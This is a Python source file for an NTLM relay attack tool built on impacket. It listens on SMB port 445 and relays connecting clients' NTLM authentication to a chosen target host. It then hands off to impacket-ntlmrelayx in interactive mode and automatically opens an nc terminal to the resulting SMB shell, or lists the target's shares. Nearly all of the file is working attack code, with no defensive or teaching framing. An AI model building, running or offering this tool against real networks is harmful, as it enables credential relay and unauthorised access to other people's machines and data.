import socket
import threading
import logging
import subprocess # Add missing import
from impacket import smb, nmb
from impacket.smbconnection import SMBConnection
from impacket.smb3structs import SMB2_DIALECT_002, SMB2_DIALECT_21, SMB2Packet, SMB2Negotiate_Response, SMB2_NEGOTIATE, SMB2SessionSetup
from impacket.ntlm import NTLMAuthNegotiate, NTLMAuthChallenge, NTLMAuthChallengeResponse
import struct
import time
import platform
import io # Needed for decoding output

class NTLMRelayServer:
    def __init__(self, listen_address='0.0.0.0', listen_port=445):
        self.listen_port = listen_port
        self.running = False
        self.server_socket = None
        self.clients = []
        self.lock = threading.Lock()
        self.logger = logging.getLogger(__name__)
        self.server_thread = None
        self.target = None
        self.target_computer_name = None
        self.fallback_ports = [445, 8445, 8446, 8447, 8448]

        # Handle interface name resolution for Linux
        if platform.system() == 'Linux':
            try:
                # If an interface name is provided, get its IP
                if listen_address != '0.0.0.0' and not self._is_ip_address(listen_address):
                    import subprocess
                    # Use ip addr show to get interface IP
                    cmd = ['ip', 'addr', 'show', listen_address]
                    try:
                        output = subprocess.check_output(cmd, universal_newlines=True)
                        # Extract IPv4 address using simple parsing
                        for line in output.split('\n'):
                            if 'inet ' in line:
                                ip = line.split()[1].split('/')[0]
                                if not ip.startswith('127.'):
                                    self.listen_address = ip
                                    self.logger.info(f"Resolved interface {listen_address} to IP: {self.listen_address}")
                                    break
                        else:
                            self.logger.warning(f"No IPv4 address found for interface {listen_address}, falling back to 0.0.0.0")
                            self.listen_address = '0.0.0.0'
                    except subprocess.CalledProcessError:
                        self.logger.warning(f"Failed to get IP for interface {listen_address}, falling back to 0.0.0.0")
                        self.listen_address = '0.0.0.0'
                else:
                    self.listen_address = listen_address
            except Exception as e:
                self.logger.warning(f"Error resolving interface: {e}, using interface name as provided")
                self.listen_address = listen_address
        else:
            self.listen_address = listen_address

    def _is_ip_address(self, addr):
        try:
            socket.inet_aton(addr)
            return True
        except socket.error:
            return False

    def set_target(self, target):
        """Set the target for NTLM relay"""
        try:
            # Basic IP format validation
            try:
                socket.inet_aton(target)
                self.target = target
                # Try to get NetBIOS name
                self._get_target_computer_name()
                self.logger.info(f"[+] Target IP set to: {self.target}")
                return
            except socket.error:
                pass

            # Try DNS resolution if not an IP
            try:
                target_ip = socket.gethostbyname(target)
                self.target = target_ip
                # Try to get NetBIOS name
                self._get_target_computer_name()
                self.logger.info(f"[+] Resolved target {target} to IP: {self.target}")
            except socket.gaierror as e:
                raise ValueError(f"Could not resolve target hostname: {target} - {str(e)}")

        except Exception as e:
            self.logger.error(f"[-] Failed to set target: {e}")
            raise

    def _get_target_computer_name(self):
        """Try to get the NetBIOS name of the target"""
        try:
            nm = nmb.NetBIOS()
            nm.set_timeout(1)
            names = nm.queryIPForName(self.target)
            if names:
                self.target_computer_name = names[0]
                self.logger.info(f"[+] Target computer name: {self.target_computer_name}")
            else:
                # Fallback to IP if NetBIOS name not found
                self.target_computer_name = self.target
                self.logger.debug(f"[*] Using IP as computer name: {self.target_computer_name}")
        except Exception as e:
            # Fallback to IP if NetBIOS query fails
            self.target_computer_name = self.target
            self.logger.debug(f"[*] NetBIOS query failed, using IP as computer name: {self.target_computer_name}")

    def _try_bind_port(self):
        """Try to bind to an available port"""
        last_error = None
        tried_ports = []

        # Try the specified port first
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.listen_address, self.listen_port))
            return True
        except socket.error as e:
            last_error = e
            tried_ports.append(self.listen_port)
            self.server_socket.close()

        # Try fallback ports
        for port in self.fallback_ports:
            if port in tried_ports:
                continue
            
            try:
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.server_socket.bind((self.listen_address, port))
                self.listen_port = port
                return True
            except socket.error as e:
                last_error = e
                tried_ports.append(port)
                self.server_socket.close()

        raise last_error

    def start(self):
        """Start the NTLM Relay Server"""
        if not self.target:
            raise ValueError("Target must be set before starting the server")

        try:
            # Test target connectivity first
            self._test_target_connectivity()
            
            # Try to bind to a port
            if self._try_bind_port():
                self.server_socket.listen(5)
                self.running = True
                self.server_thread = threading.Thread(target=self._accept_connections, daemon=True)
                self.server_thread.start()
                self.logger.info(f"[+] NTLM Relay Server listening on {self.listen_address}:{self.listen_port}")
                time.sleep(0.1)  # Give the thread time to start
                
        except Exception as e:
            self.logger.error(f"[-] Failed to start server: {e}")
            self.stop()
            raise

    def _test_target_connectivity(self):
        """Test if target is reachable"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.target, 445))
            sock.close()
            
            if result != 0:
                raise ConnectionError(f"Target {self.target} is not accessible on port 445")
                
            self.logger.info(f"[+] Target {self.target} is accessible")
            
        except Exception as e:
            raise ConnectionError(f"Failed to connect to target: {e}")

    def _connect_to_target(self):
        """Establish SMB connection object for target"""
        try:
            # Create SMB Connection with proper parameters
            # Use target IP for remoteHost, and resolved/fallback name for remoteName
            smbClient = SMBConnection(remoteName=self.target_computer_name,
                                    remoteHost=self.target,
                                    myName='RELAY', # Use a generic name for our client
                                    sess_port=445)

            smbClient.setTimeout(5) # Set timeout
            self.logger.debug(f"[*] SMBConnection object created for target {self.target}")
            return smbClient

        except Exception as e:
            self.logger.error(f"[-] Error creating SMBConnection object for target {self.target}: {e}", exc_info=True)
            return None

    def _accept_connections(self):
        """Accept incoming connections"""
        while self.running:
            try:
                client, address = self.server_socket.accept()
                self.logger.info(f"[+] Connection from {address[0]}:{address[1]}")
                
                with self.lock:
                    self.clients.append(client)
                
                client_thread = threading.Thread(
                    target=self._handle_relay_authentication,
                    args=(client, address),
                    daemon=True
                )
                client_thread.start()
                
            except Exception as e:
                if self.running:
                    self.logger.error(f"[-] Error accepting connection: {e}")
                break

    def _launch_nc_terminal(self):
        """Launches nc 127.0.0.1 11000 in a new terminal based on OS."""
        nc_cmd = "nc 127.0.0.1 11000"
        # Command to keep terminal open after nc finishes (useful for seeing errors)
        # Varies slightly between terminals
        keep_open_cmd = "; exec bash" # Common for bash shells
        self.logger.info(f"[*] Interactive shell detected. Launching '{nc_cmd}' in a new terminal...")
        launched = False
        try:
            if platform.system() == "Windows":
                term_cmd = f"start cmd /k {nc_cmd}"
                subprocess.Popen(term_cmd, shell=True)
                self.logger.info("Launched nc in new cmd window.")
                launched = True
            elif platform.system() == "Linux":
                # List of terminals to try, with their command structures
                terminals_to_try = [
                    ("gnome-terminal", ["gnome-terminal", "--", "bash", "-c", f"{nc_cmd}{keep_open_cmd}"]),
                    ("xfce4-terminal", ["xfce4-terminal", "--command", f"bash -c '{nc_cmd}{keep_open_cmd}'"]),
                    ("konsole", ["konsole", "-e", f"bash -c '{nc_cmd}{keep_open_cmd}'"]),
                    ("qterminal", ["qterminal", "-e", f"bash -c '{nc_cmd}{keep_open_cmd}'"]),
                    ("terminator", ["terminator", "-e", f"bash -c '{nc_cmd}{keep_open_cmd}'"]),
                    ("tilix", ["tilix", "-e", f"bash -c '{nc_cmd}{keep_open_cmd}'"]),
                    ("xterm", ["xterm", "-e", f"bash -c '{nc_cmd}{keep_open_cmd}'"]),
                ]

                for name, cmd_list in terminals_to_try:
                    try:
                        subprocess.Popen(cmd_list)
                        self.logger.info(f"Launched nc in {name}.")
                        launched = True
                        break # Stop trying once one works
                    except FileNotFoundError:
                        self.logger.debug(f"[*] {name} not found, trying next...")
                    except Exception as term_e:
                        self.logger.warning(f"[*] Failed to launch {name}: {term_e}")

            elif platform.system() == "Darwin": # macOS
                term_cmd = f"""osascript -e 'tell app "Terminal" to do script "{nc_cmd}"'"""
                subprocess.Popen(term_cmd, shell=True)
                self.logger.info("Launched nc in Terminal.app.")
                launched = True
            
            if not launched:
                 self.logger.warning(f"Could not automatically launch nc in a known terminal for OS ({platform.system()}). Please run '{nc_cmd}' manually in a new terminal.")

        except Exception as e:
            self.logger.error(f"[-] Failed during nc terminal launch process: {e}", exc_info=True)


    def _monitor_impacket_output(self, process):
        """Monitors impacket process output for the shell start message."""
        shell_started_marker = "[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000"
        self.logger.debug(f"[*] Monitoring impacket output for: '{shell_started_marker}'")

        # Use io.TextIOWrapper for proper decoding and handling line endings
        try:
            for line in io.TextIOWrapper(process.stdout, encoding="utf-8", errors='ignore'):
                line = line.strip() # Remove leading/trailing whitespace
                if line: # Log non-empty lines for debugging if needed
                    self.logger.debug(f"[impacket] {line}")
                if shell_started_marker in line:
                    self._launch_nc_terminal()
                    break # Stop monitoring once found
        except Exception as e:
             # Handle cases like process terminating unexpectedly
             self.logger.error(f"[-] Error reading impacket output: {e}", exc_info=True)
        finally:
            self.logger.debug("[*] Impacket output monitoring thread finished.")
            # Ensure the process doesn't hang if we break early or error out
            try:
                process.stdout.close()
            except:
                pass


    def _handle_relay_authentication(self, client_socket, address):
        """Handle the NTLM relay authentication process"""
        target_conn = None
        client_smb_packet = None
        target_smb_packet = None
        try:
            self.logger.debug(f"[*] Handling connection from {address[0]}")
            # Establish connection object for target
            target_conn = self._connect_to_target()
            if not target_conn:
                self.logger.debug(f"[*] Failed to create target connection object for {address[0]}")
                return

            # --- Phase 1: SMB Negotiation ---
            try:
                client_socket.settimeout(10)
                client_smb_negotiate_data = client_socket.recv(4096)
                if not client_smb_negotiate_data:
                    self.logger.debug(f"[*] Client {address[0]} disconnected after initial connection.")
                    return
                self.logger.debug(f"[*] Received initial SMB Negotiate Request from {address[0]}")

                # Let's modify our approach to use impacket-ntlmrelayx as a subprocess for more reliable relay
                # This is much more reliable than trying to implement all the SMB protocol details manually
                self.logger.info(f"[*] Falling back to impacket-ntlmrelayx for more reliable relay")
                try:
                    # Check if client is the same as target (prevent self-relay)
                    if address[0] == self.target:
                        self.logger.warning(f"[-] Client {address[0]} is same as target - cannot relay to self!")
                        return
                        
                    # Create a targets.txt file with the target IP
                    with open('targets.txt', 'w') as f:
                        f.write(f"{self.target}")
                    
                    # Close our current socket to free up port 445
                    self.logger.debug(f"[*] Closing relay server to hand over to impacket-ntlmrelayx")
                    self.stop() # Stop the primary listener
                    
                    # Launch impacket-ntlmrelayx as a subprocess
                    cmd = ["impacket-ntlmrelayx", "-tf", "targets.txt", "-smb2support", "-i"]
                    self.logger.info(f"[*] Executing: {' '.join(cmd)}")

                    # Run impacket, capturing stdout
                    impacket_process = subprocess.Popen(
                        cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT, # Redirect stderr to stdout
                        bufsize=1, # Line buffered
                        universal_newlines=False # Read as bytes for io.TextIOWrapper
                    )

                    # Start a thread to monitor the output
                    monitor_thread = threading.Thread(
                        target=self._monitor_impacket_output,
                        args=(impacket_process,),
                        daemon=True # Allow script to exit even if thread is running
                    )
                    monitor_thread.start()

                    # The handler thread's job is done here.
                    # It launched impacket and the monitor thread.
                    # The monitor thread will launch nc when ready.
                    # We don't wait for impacket_process here, as it runs indefinitely.
                    self.logger.debug("[*] Handed off to impacket-ntlmrelayx and monitor thread.")
                    return # Exit this handler thread

                except Exception as e:
                    self.logger.error(f"[-] Failed to launch impacket-ntlmrelayx: {e}", exc_info=True)
                    # If fallback fails, maybe restart the original server? Or just exit.
                    # For now, just log the error and exit the handler thread.
                    # Consider attempting to restart the server if needed.
                    return
            except socket.timeout:
                self.logger.debug(f"[*] Socket timed out during SMB negotiation phase with {address[0]}.")
                return
            except Exception as e:
                self.logger.error(f"[-] Error during SMB negotiation phase with {address[0]}: {e}", exc_info=True)
                return
            finally:
                # Only reset timeout if socket is still valid
                try:
                    if self.running and client_socket and client_socket.fileno() >= 0:
                        client_socket.settimeout(None)
                except (socket.error, OSError):
                    pass  # Socket already closed, ignore
            # --- End Phase 1 ---

            # --- Phase 2: NTLM Authentication Relay ---
            # This part is now effectively unreachable if the impacket fallback succeeds
            # because the function returns after launching impacket.
            # Keep it for potential future use or if the fallback logic changes.
            self.logger.debug(f"[*] Receiving NTLM Type 1 (Session Setup) from {address[0]}")
            client_session_setup_type1_data = client_socket.recv(4096)
            if not client_session_setup_type1_data:
                 self.logger.debug(f"[*] Client {address[0]} disconnected before sending NTLM Type 1.")
                 return

            # Extract NTLM Type 1 blob
            client_smb_packet = SMB2Packet(client_session_setup_type1_data)
            if client_smb_packet['Command'] != SMB2SessionSetup.COMMAND:
                 self.logger.error(f"[-] Expected SMB2 Session Setup from client {address[0]}, got command {client_smb_packet['Command']}")
                 return
            session_setup_req = SMB2SessionSetup(client_smb_packet['Data'])
            ntlm_negotiate = NTLMAuthNegotiate()
            ntlm_negotiate.fromString(session_setup_req['Buffer'])
            self.logger.info("[+] NTLM Type 1 received from client")

            # Relay NTLM Type 1 to target using sessionSetup
            self.logger.debug(f"[*] Relaying NTLM Type 1 to target {self.target}")
            target_session_setup_resp_data = target_conn.sessionSetup(ntlm_negotiate)
            if not target_session_setup_resp_data:
                 self.logger.error(f"[-] Target {self.target} did not send NTLM Type 2 challenge.")
                 return

            # Extract NTLM Type 2 blob
            target_smb_packet = SMB2Packet(target_session_setup_resp_data)
            if target_smb_packet['Status'] != 0x0103: # STATUS_MORE_PROCESSING_REQUIRED
                 self.logger.error(f"[-] Target {self.target} did not return STATUS_MORE_PROCESSING_REQUIRED. Status: {target_smb_packet['Status']:#x}")
                 client_socket.send(target_session_setup_resp_data)
                 return
            session_setup_resp = SMB2SessionSetup(target_smb_packet['Data'])
            ntlm_challenge = NTLMAuthChallenge()
            ntlm_challenge.fromString(session_setup_resp['Buffer'])
            self.logger.info("[+] Received Type 2 challenge from target")

            # Send target's challenge response (entire SMB packet) back to client
            self.logger.debug(f"[*] Sending target's NTLM Type 2 challenge to client {address[0]}")
            client_socket.send(target_session_setup_resp_data)

            # Receive NTLM Type 3 from client
            self.logger.debug(f"[*] Receiving NTLM Type 3 (Session Setup Auth) from {address[0]}")
            client_session_setup_type3_data = client_socket.recv(4096)
            if not client_session_setup_type3_data:
                 self.logger.debug(f"[*] Client {address[0]} disconnected before sending NTLM Type 3.")
                 return

            # Extract NTLM Type 3 blob
            client_smb_packet = SMB2Packet(client_session_setup_type3_data)
            if client_smb_packet['Command'] != SMB2SessionSetup.COMMAND:
                 self.logger.error(f"[-] Expected SMB2 Session Setup Auth from client {address[0]}, got command {client_smb_packet['Command']}")
                 return
            session_setup_req_auth = SMB2SessionSetup(client_smb_packet['Data'])
            ntlm_response = NTLMAuthChallengeResponse()
            ntlm_response.fromString(session_setup_req_auth['Buffer'])
            self.logger.info("[+] Got Type 3 auth response from client")

            # Relay NTLM Type 3 to target
            self.logger.debug(f"[*] Relaying NTLM Type 3 to target {self.target}")
            target_final_resp_data = target_conn.sessionSetup(ntlmChallengeResponse=ntlm_response)
            if not target_final_resp_data:
                 self.logger.error(f"[-] Target {self.target} did not send final authentication response.")
                 return

            # Check target's final response status
            target_smb_packet = SMB2Packet(target_final_resp_data)
            if target_smb_packet['Status'] == 0: # STATUS_SUCCESS
                self.logger.info("[+] Successfully authenticated to target!")
                self.logger.debug(f"[*] Sending SUCCESS status to client {address[0]}")
                client_socket.send(target_final_resp_data)
                self._execute_commands(target_conn)
            else:
                self.logger.error(f"[-] Authentication to target failed. Status: {target_smb_packet['Status']:#x}")
                self.logger.debug(f"[*] Sending FAILURE status to client {address[0]}")
                client_socket.send(target_final_resp_data)
            # --- End Phase 2 ---

        except ConnectionResetError:
             self.logger.warning(f"[*] Connection reset by {address[0]} during relay.")
        except socket.timeout:
             self.logger.warning(f"[*] Socket timed out during relay with {address[0]}.")
        except Exception as e:
            self.logger.error(f"[-] Relay authentication failed: {e}", exc_info=True)
        finally:
            # Close target connection if it exists
            if target_conn:
                try:
                    target_conn.close()
                except Exception as disconnect_e:
                    self.logger.debug(f"Error closing target connection: {disconnect_e}")

            # Remove client from list and close socket
            with self.lock:
                if client_socket in self.clients:
                    self.clients.remove(client_socket)
            
            # Only try to close if socket is still valid
            try:
                if client_socket and client_socket.fileno() >= 0:
                    try:
                        client_socket.shutdown(socket.SHUT_RDWR)
                    except:
                        pass
                    client_socket.close()
                    self.logger.debug(f"[*] Closed connection for {address[0]}")
            except (socket.error, OSError):
                pass  # Socket already closed, ignore

    def _create_negotiate_response(self, dialect):
        """Create a proper SMB negotiate response based on the dialect"""
        try:
            # This is a simplified response - actual implementation would be more complex
            # For now, just return a basic SMB2 negotiate response that should satisfy most clients
            
            # Simplified SMB2 NEGOTIATE Response
            response = b'\x00\x00\x00\x9c' # NetBIOS session service
            response += b'\xfe\x53\x4d\x42' # SMB2 protocol ID
            response += b'\x40\x00'  # Structure size
            response += b'\x00\x00'  # Credit charge
            response += b'\x00\x00\x00\x00' # Status (SUCCESS)
            response += b'\x01\x00'  # Command: NEGOTIATE
            response += b'\x01\x00'  # Credits granted
            response += b'\x00\x00\x00\x00' # Flags
            response += b'\x00\x00\x00\x00' # Next command
            response += b'\x00\x00\x00\x00\x00\x00\x00\x00' # Message ID
            response += b'\x00\x00\x00\x00\x00\x00\x00\x00' # Reserved/Process ID
            response += b'\x00\x00\x00\x00\x00\x00\x00\x00' # Tree ID
            response += b'\x00\x00\x00\x00\x00\x00\x00\x00' # Session ID
            response += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' # Signature
            
            # Negotiate Response body
            response += b'\x41\x00'  # Structure size
            response += b'\x01\x00'  # Security mode (signing enabled)
            response += b'\x01\x03'  # Dialect selected (0x0311 = SMB 3.1.1)
            response += b'\x00\x00'  # Reserved
            response += b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' # Server GUID
            response += b'\x7f\x00\x00\x00' # Capabilities
            response += b'\x00\x00\x10\x00' # Max transaction size
            response += b'\x00\x00\x10\x00' # Max read size
            response += b'\x00\x00\x10\x00' # Max write size
            response += b'\x00\x00\x00\x00\x00\x00\x00\x00' # System time
            response += b'\x00\x00\x00\x00\x00\x00\x00\x00' # Server start time
            response += b'\x60\x00'  # Security buffer offset
            response += b'\x20\x00'  # Security buffer length
            
            # Security buffer - very basic SPNEGO/NTLM OID
            response += b'\x60\x48\x06\x06\x2b\x06\x01\x05\x05\x02\xa0\x3e\x30\x3c\xa0\x0e\x30\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a\xa2\x2a\x04\x28\x4e\x54\x4c\x4d\x53\x53\x50\x00'
            
            return response
            
        except Exception as e:
            self.logger.error(f"[-] Error creating negotiate response: {e}", exc_info=True)
            # In case of error, return a minimal response that might work
            return b'\x00\x00\x00\x35\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x98\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00'

    def _execute_commands(self, target_conn):
        """Execute commands on successful authentication"""
        try:
            self.logger.info("[+] Listing shares on target:")
            shares = target_conn.listShares()
            for share in shares:
                self.logger.info(f"    - {share['shi1_netname']}")
        except Exception as e:
            self.logger.error(f"[-] Failed to execute commands: {e}")

    def stop(self):
        """Stop the NTLM Relay Server"""
        # Add check to prevent duplicate stop logs/actions if already stopped
        if not self.running: 
            return

        self.running = False
        
        with self.lock:
            for client in self.clients:
                try:
                    client.close()
                except:
                    pass
            self.clients.clear()
        
        if self.server_socket:
            try:
                self.server_socket.shutdown(socket.SHUT_RDWR)
            except:
                pass
            finally:
                self.server_socket.close()
                self.server_socket = None

        if self.server_thread and self.server_thread.is_alive():
            self.server_thread.join(timeout=1.0)
            
        self.logger.info("[*] NTLM Relay Server stopped")